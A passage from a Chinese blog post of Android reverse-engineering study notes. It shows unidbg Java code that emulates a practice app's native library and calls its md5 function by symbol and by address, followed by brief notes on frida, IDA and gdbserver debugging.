com.dta.lesson2;<br><br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.LibraryResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.arm.backend.DynarmicFactory;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.sun.jna.Pointer;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MainActivity</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建模拟器实例，要模拟32位或者64位，在这里区分</span><br>        emulator = AndroidEmulatorBuilder<br>                <span class="hljs-comment">// 指定32位CPU</span><br>                .for32Bit()<br>                <span class="hljs-comment">// 添加后端， 推荐使用Dynarmic，运行速度快，但是不支持某些新特性</span><br>                .addBackendFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DynarmicFactory</span>(<span class="hljs-literal">true</span>))<br>                <span class="hljs-comment">// 指定进程名，推荐以安卓包名做进程名</span><br>                <span class="hljs-comment">// .setProcessName(&quot;&quot;)</span><br>                .build();<br>        <span class="hljs-comment">// 模拟器的内存操作接口</span><br>        <span class="hljs-type">Memory</span> <span class="hljs-variable">memory</span> <span class="hljs-operator">=</span> emulator.getMemory();<br>        <span class="hljs-comment">// 设置SDK版本</span><br>        <span class="hljs-type">LibraryResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">// 设置系统类库解析</span><br>        memory.setLibraryResolver(resolver);<br>        <span class="hljs-comment">// 创建Android虚拟机</span><br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\libnative-lib\\app-debug.apk&quot;</span>));<br>        <span class="hljs-comment">// 设置是否打印Jni调用细节</span><br>        vm.setVerbose(<span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 加载libnative-lib.so到unicorn虚拟内存，加载成功以后会默认调用init_array等函数</span><br>        <span class="hljs-type">DalvikModule</span> <span class="hljs-variable">dm</span> <span class="hljs-operator">=</span> vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\libnative-lib\\libnative-lib.so&quot;</span>), <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//获取本SO模块的句柄,后续需要用它</span><br>        <span class="hljs-keyword">module</span> = dm.getModule();<br>        <span class="hljs-comment">// 调用JNI OnLoad</span><br>        dm.callJNI_OnLoad(emulator);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">md5</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">/* 符号调用</span><br><span class="hljs-comment">        创建项目要和包名一致, 因为unidbg会根据this的包名进行匹配JNI方法,所以this所属类的包名应该与目标函数相同(com.dta.lesson2)</span><br><span class="hljs-comment">        例如这里this的包名是com.dta.lesson2,那么就相当于调用Java_com_dta_lesson2_md5(JNIEnv *env, jobject thiz, jstring str);</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.dta.lesson2.MainActivity&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dta&quot;</span>;<br>        DvmObject&lt;?&gt; result = object.callJniMethodObject(emulator,<span class="hljs-string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) result.getValue();<br>        System.out.println(<span class="hljs-string">&quot;(symbol)md5 ====&gt; result: &quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call_address</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">/* 地址调用（虽然复杂，但是最好用）</span><br><span class="hljs-comment">        这部分基本上固定写法，只需要改地址偏移和参数类型就行</span><br><span class="hljs-comment">        在so文件里面方法的一般是Java_com_dta_lesson2_md5(JNIEnv *env, jobject thiz, jstring str);</span><br><span class="hljs-comment">        所以下面要创建对应的参数, 基本为固定写法</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Pointer</span> <span class="hljs-variable">jniEnv</span> <span class="hljs-operator">=</span> vm.getJNIEnv();<br>        DvmObject&lt;?&gt; obj = ProxyDvmObject.createObject(vm, <span class="hljs-built_in">this</span>);<br>        <span class="hljs-comment">// 如果要传入vm.addLocalObject，String只能这么写</span><br>        <span class="hljs-type">StringObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringObject</span>(vm, <span class="hljs-string">&quot;dta&quot;</span>);<br><br>        List&lt;Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        args.add(jniEnv);<br>        <span class="hljs-comment">// 除了指针类型和Number类型都需要添加到vm(vm.addLocalObject)才能够在vm中操作该对象</span><br>        args.add(vm.addLocalObject(obj));<br>        args.add(vm.addLocalObject(data));<br><br>        <span class="hljs-comment">// 0x8E81是地址偏移（加过1的）</span><br>        <span class="hljs-type">Number</span> <span class="hljs-variable">numbers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">module</span>.callFunction(emulator, <span class="hljs-number">0x8E81</span>, args.toArray());<br>        DvmObject&lt;?&gt; object = vm.getObject(numbers.intValue());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) object.getValue();<br>        System.out.println(<span class="hljs-string">&quot;(addr)md5 ====&gt; result: &quot;</span> + value);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MainActivity</span> <span class="hljs-variable">mainActivity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MainActivity</span>();<br>        mainActivity.md5();<br><br>        mainActivity.call_address();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="image-20240724202817696.png" srcset="/img/loading.gif" lazyload alt="image-20240724202817696"></p>
<p>native层还得看frida。。。。。。。。。</p>
<p>ida调试so文件（re11113）</p>
<p><img src="image-20240725034556041.png" srcset="/img/loading.gif" lazyload alt="image-20240725034556041"></p>
<p><img src="image-20240725034618178.png" srcset="/img/loading.gif" lazyload alt="image-20240725034618178"></p>
<p>gdbserver无法发送SIGINT信号给指定进程组的进程</p>
<p>估计要jeb调试</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Android分析</div>
      <div>http://example.com/2025/03/22/android分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>hexi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年3月22日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/03/22/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/" title="java常规漏洞">
                        <span class="hidden-mobile">java常规漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
